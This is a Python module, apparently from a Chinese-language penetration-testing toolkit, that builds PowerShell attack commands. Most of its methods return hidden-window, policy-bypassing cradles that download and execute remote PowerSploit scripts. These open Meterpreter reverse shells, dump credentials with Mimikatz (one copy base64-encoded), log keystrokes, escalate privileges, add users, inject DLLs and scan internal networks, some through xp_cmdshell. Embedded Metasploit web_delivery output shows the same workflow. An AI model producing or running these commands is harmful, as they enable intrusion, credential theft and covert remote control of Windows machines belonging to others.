# encoding: utf8
from config import *

class Shell:
    def __init__(self):
        self.info = {
            'Name': 'Powershell',
            'Author': 'whois',
            'Update': '2018/9/15',
        }

        self.github = """
https://github.com/PowerShellMafia/PowerSploit
https://github.com/jaredhaight/PSAttack
https://github.com/samratashok/nishang
"""

        self.desc_reverse = u"""
[+] metasploit和cobalt通用

msf5 exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)

Payload options (windows/meterpreter/reverse_http):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     127.0.0.1        yes       The local listener hostname
   LPORT     8888             yes       The local listener port
   LURI                       no        The HTTP Path

msf5 exploit(multi/script/web_delivery) > run
powershell.exe -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy();$x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $x.downloadstring('http://127.0.0.1:8080/69NGTqwFydS2');
"""

        self.desc_invoke_shellcode = u"""
Payload options (windows/meterpreter/reverse_http):

Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
LHOST     192.168.30.129   yes       The local listener hostname
LPORT     89               yes       The local listener port

Help:
PS > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')

PS > Get-Help Invoke-Shellcode -examples
"""

        self.desc_portscan = u"""
当渗透进内网机器时利用powershell进行端口扫描

PS > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/Recon/Invoke-Portscan.ps1')

PS > Invoke-Portscan -Hosts 10.10.10.101/24  -TopPorts 100

Hostname      : 10.10.10.101
alive         : True
openPorts     : {80, 3389, 445, 139...}
closedPorts   : {443, 21, 110, 143...}
filteredPorts : {}
finishTime    : 2018/7/7 14:46:14

远程执行，注意双引号
SQL> xp_cmdshell "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(\\"https://raw.githubusercontent.com/j3ers3/PowerSploit/master/Recon/Invoke-Portscan.ps1\\"); Invoke-Portscan -Hosts 10.10.10.101 -TopPorts 50"
"""

        self.desc_keystrokes = u"""
远程不能记录？
~ $ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')

~ $ Get-Keystrokes -LogPath c:\\key.log
"""

        self.desc_invoke_dllinjection = u"""
调用invoke-dllinjection，将DLL文件直接注入到某进程中
"""

    def test(self):
        print("", self.info['Name'])
        print(self.info['Author'])

    def reverse(self):
        return "copy C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe c:\p.txt\nc:\p.txt -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('{url}'))"

    def invoke_shellcode(self, ip=LHOST, port=LPORT):
        return "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('{}/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost {} -Lport {} -Force".format(ps_url, ip, port)

    def downloader(self):
        return "powershell (new-object System.Net.WebClient).DownloadFile('{url}','C:\\{file}')"

    def mimikatz(self):
        return "Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('{}/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz".format(ps_url)

    def mimikatz_base64(self):
        return "Powershell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBoAGUAZQB0AHoALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AA=="

    def powerup_check(self):
        return "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('{}/Privesc/PowerUp.ps1'); Invoke-AllChecks".format(ps_url)

    def powerup_add_user(self):
        return "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('{}/Privesc/PowerUp.ps1');Write-ServiceExe -ServiceName xxx -Username test1 -Password 123!@#qwe -Verbose".format(ps_url)

    def portscan(self):
        return "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('{ps_url}/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts {ip}/24 -TopPorts 100"

    def invoke_dllinjection(self):
        return "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('{}/CodeExecution/Invoke-DllInjection.ps1');Invoke-DllInjection -Dll evil.dll -ProcessID 1111".format(ps_url)
